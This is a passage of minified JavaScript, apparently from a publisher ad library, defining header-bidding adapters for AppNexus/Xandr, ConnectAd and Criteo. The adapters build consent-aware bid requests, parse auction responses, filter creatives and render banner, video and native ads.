            var a = new AdTrack.MediaTypes.Banner(s, this.track.errorReporting);
            i(a);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  var i;
  AdTrack.AppNexusChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.id = "AdTrack_" + t.type + "_" + t.domain + "_" + t.group + "_" + t.position, this.price = null, this.response = null, this.style = null, this.bidResponse = new AdTrack.Bid(), -1 !== this.chd.tag.indexOf("xandr") ? (this.channelName = "xandr", this.vendorId = 32) : -1 !== this.chd.tag.indexOf("taboola") ? (this.channelName = "projectagora", this.vendorId = 1032) : (this.channelName = "appnexus", this.vendorId = 32), this.external = this.chd.accountId && this.chd.accountId !== AdTrack.Config.getAccountId(this.channelName), this.prebidVideo = this.definition.options.hb && (this.definition.options.hb.prebidVideo || this.definition.options.customPrebidVideo), this.MTsupport = !0, this.track.shouldCsync(this.channelName) && AdTrack.UserSync.addUserSync(this.channelName, this.vendorId, function () {
      AdTrack.XandrCSync();
    }.bind(this), this.track.settings);
  }, AdTrack.AppNexusChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      if (!(-1 !== this.track.domain.indexOf("idnes.cz") || "centrum.cz" === this.track.domain) || AdTrack.UserSync.isVendorAllowed(this.vendorId)) {
        var i = this.chd.accountId || AdTrack.Config.getAccountId(this.channelName);
        if (i) {
          var r = "//" + this.getUrlPrefix() + ".adnxs.com",
            n = this.createData(e, i, this.chd.bidFloor);
          "grid.id" === this.track.domain && (n.schain || this.track.metrics.evProfiling("no schain", "schain"));
          var s = !1,
            a = !1;
          if (AdTrack.CMP) {
            var o = AdTrack.CMP.getConsentData();
            if (o) {
              s = !0, n.gdpr_consent.consent_string = o.consentString ? o.consentString : "", n.gdpr_consent.consent_required = !!o.gdprApplies;
              var d = AdTrack.CMP.getAddtlConsentAsArray && AdTrack.CMP.getAddtlConsentAsArray();
              d && d.length && (n.gdpr_consent.addtl_consent = d);
            }
          }
          if (AdTrack.USP) {
            var c = AdTrack.USP.getConsentData();
            c && c.consentString && (a = !0, n.us_privacy = c.consentString);
          }
          (s || a) && this.track.evBidConsent(this.definition, this.chd, s, a);
          var h = this;
          AdTrack.Ajax.request({
            label: "Appnexus/Xandr bid",
            url: r + "/ut/v3/prebid",
            method: "POST",
            data: JSON.stringify(n),
            json: !0,
            async: !this.definition.options.noAsync,
            headers: {},
            timeout: this.chd.timeout || 800,
            ontimeout: function () {
              this.track.evBidTimeout(this.definition, this.chd, !0);
            }.bind(this),
            onerror: function () {
              this.track.evBidError(this.definition, this.chd, !0);
            }.bind(this)
          }, this.track.errorReporting).done(function (i) {
            if (i && i.tags && i.tags[0]) {
              var r = i.tags[0].ads ? i.tags[0].ads[0] : i.tags[0].ad;
              if (r && r.cpm) {
                h.price = AdTrack.Price.create(r.cpm, AdTrack.Price.USD, null), h.bidResponse.setPrice(h.price), h.bidResponse.setCreativeId(r.creative_id);
                var n = r.content_source;
                if (n && r[n] && r[n][r.ad_type]) {
                  var s = r[n][r.ad_type],
                    a = s.content;
                  if ("native" !== r.ad_type && (h.bidResponse.setWidth(s.width || h.chd.width), h.bidResponse.setHeight(s.height || h.chd.height)), "banner" === r.ad_type) {
                    var o = AdTrack.Utils.isBlackListedAds(a),
                      d = AdTrack.Utils.testAd(a, h.definition.options.contentBlackList || []);
                    (o || d) && (o && h.track.doError("Blocked appnexus-xhr (" + h.chd.tag + ") creative (" + r.creative_id + ") by advertiser (" + r.advertiser_id + ") from " + o, "info"), h.chd.logs && h.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(h.track.server, h.chd.logs.blocked_creative, h.chd.tag, r.creative_id || "", r.deal_id || "", r.cpm, a), h.price = null);
                  }
                  "video" === r.ad_type && h.prebidVideo && (h.bidResponse.setVideoVastXML(a), h.bidResponse.setVideoImpUrl(AdTrack.Utils.getVideoImpUrl(h.track.unitID, e, h.chd, h.track.server))), "native" === r.ad_type && (s.main_img && s.title || (h.track.doError("[" + h.chd.tag + "] Insufficient data received (img:" + !!s.main_img + "|title:" + !!s.title + ")"), h.price = null));
                } else h.price = null;
              } else h.price = null;
            } else i && i.error && i.error.match("no bids"), h.price = null;
            h.response = i, t && t(h.price, i);
          }).fail(function (e, i) {
            i ? h.track.evBidTimeout(h.definition, h.chd) : h.track.evBidError(h.definition, h.chd), h.price = null, t && t(null, null);
          }).send();
        } else this.track.doError("MemberId not defined. " + this.chd.tag);
      } else t(null, null);
    },
    render: function (t, e, i) {
      e = e ? e.normal : null;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.tags && t.tags[0]) {
            var r = t.tags[0].ads ? t.tags[0].ads[0] : t.tags[0].ad;
            if (r) {
              var n = r.content_source,
                s = r.ad_type;
              if (n && r[n] && r[n][s]) {
                var a = r[n][s];
                if (this.adData = a.content, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height, "banner" === s) {
                  var o = a.content;
                  try {
                    for (var d = r[n].trackers[0].impression_urls, c = 0; c < d.length; c++) o += AdTrack.Utils.createTrackPixelHtml(d[c]);
                  } catch (t) {}
                  var h = {
                      chd: this.chd,
                      width: this.bidResponse.getDimension().width,
                      height: this.bidResponse.getDimension().height,
                      ad: {
                        data: o,
                        type: "content"
                      }
                    },
                    l = new AdTrack.MediaTypes.Banner(h, this.track.errorReporting);
                  i(l);
                } else if ("video" === s) {
                  if (this.definition.options.player && "default" === this.definition.options.player.type) {
                    var u = AdTrack.MediaTypes.createVideoSettings(this.track, this.chd, a.content, "vast_content");
                    r.notify_url && (u.impTrackers = [r.notify_url]);
                    var p = new AdTrack.MediaTypes.Video(u, this.track.errorReporting);
                    i(p);
                  } else this.track.doError(this.chd.tag + ": Not supported outstream without default player type");
                } else if ("native" === s) {
                  var f;
                  this.adData = a, a.viewability && a.viewability.config && (f = a.viewability.config);
                  var g = a.javascript_trackers;
                  null == g ? g = f : "string" == typeof g ? g = [g, f] : g.push(f);
                  var m = null;
                  a.main_img && (m = {
                    url: a.main_img.url,
                    w: a.main_img.width,
                    h: a.main_img.height
                  });
                  var k = null;
                  a.icon && (k = {
                    url: a.icon.url,
                    w: a.icon.width,
                    h: a.icon.height
                  });
                  var b = new AdTrack.AdSet();
                  b.setStyle(e);
                  var v = new AdTrack.AdChoices(),
                    A = a.privacy_link || this.chd.url;
                  v.setPromoClickUrl(A), v.setPromoText(this.chd.title), v.setOptional(!0), b.addAdChoices(v);
                  var T = new AdTrack.TextAd(),
                    y = a.link.url;
                  T.addScreenshot(m.url, m.w, m.h), T.addText(a.title, a.desc || ""), a.desc2 && T.addText(a.title, a.desc2), T.setCompanyName(a.sponsored), T.setVisibleUrl(a.displayurl), k && T.setFavicon(k.url), T.setClickTrackers(a.link.click_trackers), T.setClickUrl(y), T.setAdUrl(y), T.setCta(a.ctatext), T.done(), b.addAd(new AdTrack.AppnexusAd(b, T));
                  var w = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
                    C = {
                      chd: this.chd,
                      ad: {
                        type: "tcproxy",
                        data: {
                          adSet: b,
                          tc: w
                        }
                      },
                      style: e,
                      count: 1,
                      impTrackers: a.impression_trackers,
                      jsTrackers: g
                    },
                    U = new AdTrack.MediaTypes.Native(C, this.track.errorReporting);
                  i(U);
                } else this.track.doError(this.chd.tag + ": Not supported ad_type: " + s), this.track.passback(this.definition, this.chd);
              } else this.track.doError(this.chd.tag + ": Cant find ad"), this.track.passback(this.definition, this.chd);
            } else this.track.passback(this.definition, this.chd);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t, e, i) {
      var r = null;
      if ("projectagora" === this.channelName) {
        var n = t.match(/[0-9]+$/);
        n[0] ? r = Number(n[0]) : this.track.doError(this.channelName + " key should end with integer", null, {
          key: t
        });
      } else (r = Number(t)) || this.track.doError(this.channelName + " key should be a number", null, {
        key: t
      });
      for (var s = {
          width: this.chd.width,
          height: this.chd.height
        }, a = [s], o = this.chd.sizes ? this.chd.sizes : [], d = 0; d < o.length; d++) 2 === o[d].length && a.push({
        width: o[d][0],
        height: o[d][1]
      });
      var c = AdTrack.Utils.simpleStringGenerator(32),
        h = [],
        l = window;
      do {
        var u;
        try {
          u = l.location.href, u = encodeURIComponent(u);
        } catch (t) {
          u = "";
        }
        h.unshift(u), l = l.parent;
      } while (l !== window.top);
      var p = {
          tags: [],
          gdpr_consent: {},
          user: {},
          sdk: {
            source: "pbjs",
            version: "7.50.0"
          },
          referrer_detection: {
            rd_ref: encodeURIComponent(AdTrack.url),
            rd_top: !!AdTrack.Utils.windowTopAccess(),
            rd_ifs: h.length - 1,
            rd_stk: h.join(",")
          }
        },
        f = null;
      if (this.external ? "grid.id" === this.track.domain && this.track.metrics.evProfiling("external", "schain") : f = this.track.getSupplyChain(), "projectagora" !== this.channelName ? p.member_id = e : f && f.nodes && f.nodes.push({
        asi: "projectagora.com",
        sid: "" + e,
        hp: 1
      }), f && (p.schain = f), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var g = AdTrack.UserID.getAllUserIdsAsEids();
        g.length && (p.eids = g);
      }
      var m = {
        uuid: c,
        id: r,
        prebid: !0,
        primary_size: s,
        sizes: a,
        allow_smaller_sizes: !1,
        disable_psa: !0,
        use_pmt_rule: !1,
        hb_source: 1
      };
      return i && (m.reserve = i), "xandr-native" === this.chd.tag ? (m.ad_types = ["native"], m.native = {
        layouts: [{
          title: {
            required: !0,
            len: 140
          },
          description: {
            required: !0
          },
          main_image: {
            required: !0
          },
          sponsored_by: {
            required: !0
          },
          icon: {
            required: !1
          },
          ctatext: {
            required: !1
          },
          privacy_supported: !0
        }]
      }) : "outstream" === this.definition.renderer || this.prebidVideo ? (m.ad_types = ["video"], m.video = {
        maxduration: 90,
        minduration: 2,
        playback_method: 5,
        skippable: !0,
        skippoffset: 5
      }, m.video_frameworks = [1, 2, 3, 5]) : m.ad_types = ["banner"], p.tags.push(m), p;
    },
    getUrlPrefix: function () {
      if ("appnexus" === this.channelName) return "etarget-emea";
      if ("projectagora" === this.channelName) return "ib";
      var t;
      try {
        var e = new Date().getTimezoneOffset();
        e <= 60 && e >= -240 ? t = "emea" : e <= 300 && e > 60 ? t = "useast" : e > 300 ? t = "uswest" : e < -240 && (t = "apac");
      } catch (t) {}
      return t ? "r2b2-" + t : "r2b2-emea";
    }
  }, AdTrack.XandrCSync = AdTrack.XandrCSync || (i = !1, function () {
    i || (AdTrack.Utils.csyncFrame("https://acdn.adnxs.com/dmp/async_usersync.html"), i = !0);
  });
}, function (t, e) {
  var i;
  AdTrack.ConnectAdChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.track.shouldCsync("connectad") && AdTrack.UserSync.addUserSync("connectad", 138, function () {
      var t = null;
      AdTrack.CMP && (t = AdTrack.CMP.getConsentData()), AdTrack.ConnectadCSync(t);
    }.bind(this), this.track.settings), this.bidId = Math.floor(1e14 * Math.random()), this.transactionId = AdTrack.Utils.uuid(), this.sizeMap = {
      "120x90": 1,
      "200x200": 2,
      "468x60": 3,
      "728x90": 4,
      "300x250": 5,
      "160x600": 6,
      "120x600": 7,
      "300x100": 8,
      "180x150": 9,
      "336x280": 10,
      "240x400": 11,
      "234x60": 12,
      "88x31": 13,
      "120x60": 14,
      "120x240": 15,
      "125x125": 16,
      "220x250": 17,
      "250x250": 18,
      "250x90": 19,
      "0x0": 20,
      "200x90": 21,
      "300x50": 22,
      "320x50": 23,
      "320x480": 24,
      "185x185": 25,
      "620x45": 26,
      "300x125": 27,
      "800x250": 28,
      "980x120": 29,
      "980x150": 30,
      "320x150": 31,
      "300x300": 32,
      "200x600": 33,
      "320x500": 34,
      "320x320": 35,
      "300x600": 43,
      "970x90": 77,
      "970x250": 123,
      "970x66": 286,
      "970x280": 3230,
      "486x60": 429,
      "700x500": 374,
      "300x1050": 934,
      "320x100": 1578,
      "320x250": 331,
      "320x267": 3301,
      "728x250": 2730
    }, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.ConnectAdChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = "" + e,
        r = this.chd.width + "x" + this.chd.height,
        n = this.sizeMap[r];
      if (!n) return this.track.doError("Unsupported dimension (" + r + ") in connectad adapter"), void (t && t(null, null));
      for (var s = this.chd.sizes ? this.chd.sizes : [], a = [n], o = 0; o < s.length; o++) {
        var d = s[o][0] + "x" + s[o][1],
          c = this.sizeMap[d];
        c ? a.push(c) : this.track.doError("Unsupported dimension (" + d + ") in connectad adapter");
      }
      var h = {
          id: this.transactionId,
          divName: this.bidId,
          adTypes: a,
          sizes: [[this.chd.width, this.chd.height]].concat(s),
          networkId: "13",
          siteId: i,
          bidfloor: this.chd.bidFloor
        },
        l = {
          ext: {}
        },
        u = !1,
        p = !1;
      if (AdTrack.CMP) {
        var f = AdTrack.CMP.getConsentData();
        f && (l.ext.consent = f.consentString ? f.consentString : "", l.ext.gdpr = f.gdprApplies ? 1 : 0, u = !0);
      }
      if (AdTrack.USP) {
        var g = AdTrack.USP.getConsentData();
        g && g.consentString && (p = !0, l.ext.us_privacy = g.consentString);
      }
      if ((u || p) && this.track.evBidConsent(this.definition, this.chd, u, p), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var m = AdTrack.UserID.getAllUserIdsAsEids();
        m && (l.ext.eids = m);
      }
      var k = {
          enableBotFiltering: !0,
          includePricingData: !0,
          placements: [h],
          referrer: document.referrer,
          screensize: [window.screen.width, window.screen.height].join("x"),
          dnt: AdTrack.Utils.getDNT(),
          language: navigator.language,
          ua: navigator.userAgent,
          time: Date.now(),
          url: AdTrack.url,
          user: l
        },
        b = this.track.getSupplyChain();
      b && (k.source = {
        ext: {
          schain: b
        }
      });
      var v = this;
      AdTrack.Ajax.request({
        label: "Connectad bid",
        url: "//i.connectad.io/api/v2",
        method: "POST",
        data: JSON.stringify(k),
        json: !0,
        async: !this.definition.options.noAsync,
        headers: {
          "Content-type": "application/json"
        },
        timeout: this.chd.timeout || 800,
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (e) {
        if (e.decisions && e.decisions[v.bidId]) {
          var i = e.decisions[v.bidId],
            r = i.pricing && i.pricing.clearPrice ? i.pricing.clearPrice : null,
            n = 0 != i.creativeId ? i.creativeId : i.adId;
          if (i.pricing) if (2 !== i.pricing.ratetype && v.track.doError("Connectad - unexpected ratetype - " + i.pricing.ratetype), i.pricing.revenue) {
            var s = 1e3 * i.pricing.revenue;
            if (r) {
              i.pricing.eCPM !== r && v.track.doError("Connectad - eCPM differs (" + !!i.pricing.eCPM + ")");
              var a = s / r;
              Math.abs(1 - a) > .02 && v.track.doError("Connectad - price discrepancy");
            } else v.track.doError("Connectad - no clearPrice in response");
            "mobile_parlamentnilisty.cz_generic_fixed" === v.track.unitID.getName() && (r = s);
          } else v.track.doError("Connectad - no revenue in response");
          v.price = r ? AdTrack.Price.create(r, AdTrack.Price.USD) : null, v.bidResponse.setCreativeId(n), v.bidResponse.setPrice(v.price);
          var o = i.contents && i.contents[0] ? i.contents[0] : null;
          if (o) {
            var d = AdTrack.Utils.isBlackListedAds(o.body),
              c = AdTrack.Utils.testAd(o.body, v.definition.options.contentBlackList || []);
            !1 === d && !1 === c ? (v.bidResponse.setWidth(o.width || o.data.width), v.bidResponse.setHeight(o.height || o.data.height)) : (d && v.track.doError("Blocked connectad creative from " + d + " with id " + i.creativeId, "info"), v.chd.logs && v.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(v.track.server, v.chd.logs.blocked_creative, v.chd.tag, n || "", "", r, o.body), e = null, v.price = null);
          }
        } else v.price = null;
        v.response = e, t && t(v.price, e);
      }).fail(function (e, i) {
        i ? v.track.evBidTimeout(v.definition, v.chd) : v.track.evBidError(v.definition, v.chd), v.price = null, t && t(null, null);
      }).send();
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t.decisions && t.decisions[this.bidId]) {
            var e = t.decisions[this.bidId],
              r = e.contents && e.contents[0] ? e.contents[0] : null;
            if (r && r.body) {
              this.adData = r.body, this.chd.width = this.bidResponse.getDimension().width, this.chd.height = this.bidResponse.getDimension().height;
              var n = {
                  chd: this.chd,
                  width: this.bidResponse.getDimension().width,
                  height: this.bidResponse.getDimension().height,
                  ad: {
                    data: r.body,
                    type: "content"
                  },
                  impTrackers: [e.impressionUrl]
                },
                s = new AdTrack.MediaTypes.Banner(n, this.track.errorReporting);
              i(s);
            } else this.track.doError("Invalid response in " + this.chd.tag);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  }, AdTrack.ConnectadCSync = AdTrack.ConnectadCSync || (i = !1, function (t) {
    if (!i) {
      var e = [];
      t && (e.push("gdpr=" + encodeURIComponent(t.gdprApplies ? 1 : 0)), e.push("gdpr_consent=" + encodeURIComponent(t.consentString ? t.consentString : "")));
      var r = "https://cdn.connectad.io/connectmyusers.php?" + e.join("&");
      AdTrack.Utils.csyncFrame(r), i = !0;
    }
  });
}, function (t, e) {
  AdTrack.CriteoHBChannel = function (t, e, i) {
    if (this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, "function" == typeof AdTrack.Criteo.getImpressionCount) {
      var r = this.track.unitID.getName();
      this.impressionCount = AdTrack.Criteo.getImpressionCount(r, this.chd.tag, this.chd.flag), this.chd.keyPostfix = "_inc" + (this.impressionCount + 1);
    }
  }, AdTrack.CriteoHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    profiling: function (t) {
      this.track.metrics.evProfiling("Criteo-HB-3 " + t);
    },
    bid: function (t, e) {
      this.profiling("bid start");
      var i = this.parseKey(e);
      if (!i.zoneId && !i.subId) return this.track.doError("Wrong format for key, should be either [zoneid]-[publisherSubid] or just zoneid"), void (t && t(null, null));
      if (i.subId && this.impressionCount && this.impressionCount >= 10) t && t(null, null);else {
        window.Criteo = window.Criteo || {}, window.Criteo.events = window.Criteo.events || [];
        var r = this.createPlacement(i),
          n = null;
        if (!r.zoneid) {
          n = AdTrack.Config.getAccountId("criteo");
          var s = [];
          this.chd.width && this.chd.height && s.push(this.chd.width + "x" + this.chd.height), this.chd.sizes && this.chd.sizes.length > 0 && this.chd.sizes.forEach(function (t) {
            2 === t.length && s.push(t[0] + "x" + t[1]);
          }), r.sizes = s;
        }
        var a = function () {
          var e = {
            placements: [r]
          };
          n && (e.networkId = n), "function" == typeof Criteo.RequestBids ? (this.profiling("bid request"), Criteo.RequestBids(e, this.onResponse(e, t), this.chd.timeout || 1500)) : t && t(this.price, this.response);
        }.bind(this);
        window.Criteo.events && "function" == typeof window.Criteo.events.push ? window.Criteo.events.push(a) : t && t(this.price, this.response);
      }
    },
    render: function (t, e, i) {
      this.container = t, e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.displayUrl) {
            var e = function () {
                AdTrack.adblock || this.track.doError("[" + this.chd.tag + "] Failed to load resource"), this.track.passback(this.definition, this.chd);
              }.bind(this),
              r = {
                src: this.response.displayUrl
              },
              n = "<html><head></head><body>" + AdTrack.Utils.getHTMLWithErrorHandling("script", r, e) + "</body></html>",
              s = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: n,
                  type: "content"
                }
              };
            this.adData = n;
            var a = new AdTrack.MediaTypes.Banner(s, this.track.errorReporting);
            i(a);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    onResponse: function (t, e) {
      return function (t) {
        this.profiling("bid response");
        var i = null;
        if (t && t.length > 0) {
          i = t[0], this.price = AdTrack.Price.create(i.cpm, AdTrack.Price.EUR), this.bidResponse.setPrice(this.price);
          var r = i.width || this.chd.width,
            n = i.height || this.chd.height;
          this.bidResponse.setWidth(r), this.bidResponse.setHeight(n);
        } else this.price = null;
        this.response = i, e && e(this.price, i);
      }.bind(this);
    },
    parseKey: function (t) {
      if (!t) return {};
      var e = "",
        i = "",
        r = (t = "" + t).indexOf("-");
      return r < 0 ? isNaN(t) ? i = t : e = t : (e = t.substr(0, r), i = t.substr(r + 1), isNaN(e) && (e = "", i = t)), {
        zoneId: e,
        subId: i
      };
    },
    createPlacement: function (t) {
      var e = t.zoneId,
        i = t.subId;
      i && this.chd.keyPostfix && (i += this.chd.keyPostfix);
      var r = {
        slotid: "ad-" + (e ? "-" + e : "") + (i ? "-" + i : "")
      };
      return e && (r.zoneid = e), i && (r.publisherSubid = i), r;
    }
  };
}, function (t, e) {
  AdTrack.CriteoHBNativeChannel = function (t, e, i) {
    if (this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.MTsupport = !0, "function" == typeof AdTrack.Criteo.getImpressionCount) {
      var r = this.track.unitID.getName();
      this.impressionCount = AdTrack.Criteo.getImpressionCount(r, this.chd.tag, this.chd.flag), this.chd.keyPostfix = "_inc" + (this.impressionCount + 1);
    }
  }, AdTrack.CriteoHBNativeChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.parseKey(e);
      if (!i.zoneId && !i.subId) return this.track.doError("Wrong format for key, should be either [zoneid]-[publisherSubid] or just zoneid"), void (t && t(null, null));
      if (i.subId && this.impressionCount && this.impressionCount >= 10) t && t(null, null);else {
        window.Criteo = window.Criteo || {}, window.Criteo.events = window.Criteo.events || [];
        var r = this.createPlacement(i),
          n = function () {
            var e = {
              placements: [r]
            };
            "function" == typeof Criteo.RequestBids ? Criteo.RequestBids(e, this.onResponse(e, t), this.chd.timeout || 1500) : t && t(this.price, this.response);
          }.bind(this);
        window.Criteo.events && "function" == typeof window.Criteo.events.push ? window.Criteo.events.push(n) : t && t(this.price, this.response);
      }
    },
    render: function (t, e, i) {
      if (this.container = t, null != (e = e && e.product ? e.product : null)) {
        var r = this.track.getChannelKey(this.chd, e);
        if (r) {
          var n = function (r) {
            r && r.nativeCallback && r.nativePayload ? r.nativeCallback(t, e, r.nativePayload, i) : this.track.passback(this.definition, this.chd);
          }.bind(this);
          this.price && this.response ? n(this.response) : this.bid(function (t, e) {
            n(e);
          }, r);
        } else this.track.doError("Undefined key");
      } else this.track.doError("Undefined product style for " + this.chd.tag), this.track.passback(this.definition, this.chd);
    },
    onResponse: function (t, e) {
      return function (t) {
        var i = null;
        t && t.length > 0 ? (i = t[0], this.price = AdTrack.Price.create(i.cpm, AdTrack.Price.EUR)) : this.price = null, this.response = i, e && e(this.price, i);
      }.bind(this);
    },
    nativeCallback: function (t, e, i, r) {
      if (this.adData = i, i.products) {
        var n = new AdTrack.AdSet();
        n.setStyle(e);
        var s = i.advertiser,
          a = new AdTrack.Shop();
        a.setShopLogo(s.logo.url), a.setShopUrl(s.logo_click_url), a.setShopName(s.description), a.setCleanShopUrl(s.domain), n.addShop(a);
        for (var o = i.products, d = 0; d < o.length; d++) {
          var c = o[d],
            h = new AdTrack.ProductAd();
          if (!c.image.url || !c.title) return this.track.doError("[" + this.chd.tag + "] Insufficient data received (img:" + !!c.image.url + "|title:" + !!c.title + ")"), void this.track.passback(this.definition, this.chd);
          h.setClickUrl(c.click_url), h.setProductName(c.title);
          var l = c.description;
          l && l.length > 0 && (l = l[0].toUpperCase() + l.slice(1)), h.setProductDescription(l), c.price && h.setProductPrice(c.price), h.addScreenshot(c.image.url, 0, 0), h.done(), n.addAd(new AdTrack.CriteoProductAd(n, h));
        }
        this.chd.url = i.privacy.optout_click_url, this.chd.icon = i.privacy.optout_image_url;
        var u = new AdTrack.AdChoices();
        u.setPromoClickUrl(this.chd.url), u.setPromoIcon(this.chd.icon), u.setPromoText(this.chd.title), u.setOptional(!1), n.addAdChoices(u);
        var p = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
          f = {
            chd: this.chd,
            ad: {
              type: "tcproxy",
              data: {
                adSet: n,
                tc: p
              }
            },
            style: e,
            count: n.getAdsCount()
          },
          g = AdTrack.Criteo.transformImpPixels(i.impression_pixels);
        g ? f.impTrackers = g : this.track.doError("Criteo native - no imp trackers"), r(new AdTrack.MediaTypes.Native(f, this.track.errorReporting));
      } else this.track.passback(this.definition, this.chd);
    },
    parseKey: function (t) {
      if (!t) return {};
      var e = "",
        i = "",
        r = (t = "" + t).indexOf("-");
      return r < 0 ? isNaN(t) ? i = t : e = t : (e = t.substr(0, r), i = t.substr(r + 1), isNaN(e) && (e = "", i = t)), {
        zoneId: e,
        subId: i
      };
    },
    createPlacement: function (t) {
      var e = t.zoneId,
        i = t.subId;
      i && this.chd.keyPostfix && (i += this.chd.keyPostfix);
      var r = {
        slotid: "ad-" + e + (i ? "-" + i : ""),
        zoneid: e,
        nativeCallback: this.nativeCallback.bind(this)
      };
      return i && (r.publisherSubid = i), r;
    }
  };
}, function (t, e) {
  AdTrack.CriteoHBXHRChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.CriteoHBXHRChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    profiling: function (t) {
      this.track.metrics.evProfiling("Criteo-HB-XHR " + t);
    },
    bid: function (t, e) {
      this.profiling("bid start"), AdTrack.Criteo.bid(this.track, this.chd, this.bidResponse, e, AdTrack.Criteo.BANNER, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      this.container = t, e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.slots && t.slots[0]) {
            var e = t.slots[0];
            if (e.creative) {
              var r = {
                chd: this.chd,
                width: this.bidResponse.getDimension().width,
                height: this.bidResponse.getDimension().height,
                ad: {
                  data: e.creative,
                  type: "iframe"
                }
              };
              this.adData = r.ad.data;
              var n = new AdTrack.MediaTypes.Banner(r, this.track.errorReporting);
              i(n);
            } else this.track.passback(this.definition, this.chd);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  AdTrack.CriteoHBXHRNativeChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.CriteoHBXHRNativeChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    profiling: function (t) {
      this.track.metrics.evProfiling("Criteo-HB-XHR " + t);
    },
    bid: function (t, e) {
      this.profiling("bid start"), AdTrack.Criteo.bid(this.track, this.chd, this.bidResponse, e, AdTrack.Criteo.NATIVE, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      if (this.container = t, null != (e = e && e.product ? e.product : null)) {
        var r = this.track.getChannelKey(this.chd, e);
        if (r) {
          var n = function (r) {
            if (r && r.slots && r.slots[0]) {
              var n = r.slots[0];
              n.native && this.nativeCallback(t, e, n.native, i);
            } else this.track.passback(this.definition, this.chd);
          }.bind(this);
          this.price && this.response ? n(this.response) : this.bid(function (t, e) {
            n(e);
          }, r);
        } else this.track.doError("Undefined key");
      } else this.track.doError("Undefined product style for " + this.chd.tag), this.track.passback(this.definition, this.chd);
    },
    nativeCallback: function (t, e, i, r) {
      if (this.adData = i, i.products) {
        var n = new AdTrack.AdSet();
        n.setStyle(e);
        var s = i.advertiser,
          a = new AdTrack.Shop();
        a.setShopLogo(s.logo.url), a.setShopUrl(s.logo_click_url), a.setShopName(s.description), a.setCleanShopUrl(s.domain), n.addShop(a);
        for (var o = i.products, d = 0; d < o.length; d++) {
          var c = o[d],
            h = new AdTrack.ProductAd();
          if (!c.image.url || !c.title) return this.track.doError("[" + this.chd.tag + "] Insufficient data received (img:" + !!c.image.url + "|title:" + !!c.title + ")"), void this.track.passback(this.definition, this.chd);
          h.setClickUrl(c.click_url), h.setProductName(c.title);
          var l = c.description;
          l && l.length > 0 && (l = l[0].toUpperCase() + l.slice(1)), h.setProductDescription(l), c.price && h.setProductPrice(c.price), h.addScreenshot(c.image.url, 0, 0), h.done(), n.addAd(new AdTrack.CriteoProductAd(n, h));
        }
        this.chd.url = i.privacy.optout_click_url, this.chd.icon = i.privacy.optout_image_url;
        var u = new AdTrack.AdChoices();
        u.setPromoClickUrl(this.chd.url), u.setPromoIcon(this.chd.icon), u.setPromoText(this.chd.title), u.setOptional(!1), n.addAdChoices(u);
        var p = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
          f = {
            chd: this.chd,
            ad: {
              type: "tcproxy",
              data: {
                adSet: n,
                tc: p
              }
            },
            style: e,
            count: n.getAdsCount()
          },
          g = AdTrack.Criteo.transformImpPixels(i.impression_pixels);
